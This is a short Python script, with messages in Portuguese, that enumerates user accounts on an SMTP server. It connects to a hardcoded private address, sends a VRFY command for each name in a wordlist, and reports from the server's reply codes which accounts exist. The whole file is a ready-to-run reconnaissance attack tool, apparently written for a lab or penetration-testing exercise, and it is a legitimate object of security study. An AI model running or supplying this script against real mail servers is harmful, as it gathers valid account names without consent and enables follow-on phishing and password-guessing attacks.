#!/usr/bin/python3.6
import socket
from termcolor import colored
from threading import*

remoteip = "10.171.1.129"
port=int("25") 
command='VRFY' 

def smtpenum_connect():
    print("Teste de Conexao com o servidor SMTP... " + remoteip )
    global s 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip,port))
    data = s.recv(1024)
    print(data)

def smtpenum_run():
    with open('userlist.txt') as _dictionary:
        for _username in _dictionary:
            smtpcmd=(command + ' ' + _username + ' ' + ' \n')
            sendsmtpcmd=smtpcmd.encode()
            s.send(sendsmtpcmd)
            data = s.recv(1024)
            _smtpcode = data[:3]
            if "252" in str(_smtpcode):
                print (colored('[+]' ,'green'), "[+] BINGO - O conta usuario -> " , _username , " enumerada.")

            if "550" in str(_smtpcode):
                print (colored('[-]' ,'yellow'), "[-] FAIL - O conta usuario -> " , _username , " nao existe.")

            if "503" in str(_smtpcode):
                print (colored('[!]' ,'red'), "[!] ERRO - Esse servidor requer autenticacao no SMTP!!! ") 

            if "500" in str(_smtpcode):
                print (colored('[!]' ,'red'), "[!] FALHOU - O comando", command , "nao eh suportado nesse servidor!! ") 
                break

def smtpenum_end():
    s.close()
    print("\n Contas verificada - Processo de enumeracao finalizado")

def smtpenum_xpl():
    smtpenum_connect()
    smtpenum_run()
    smtpenum_end()

#smtpenum_xpl()

insane_way = Thread(target=smtpenum_xpl)
insane_way.start()

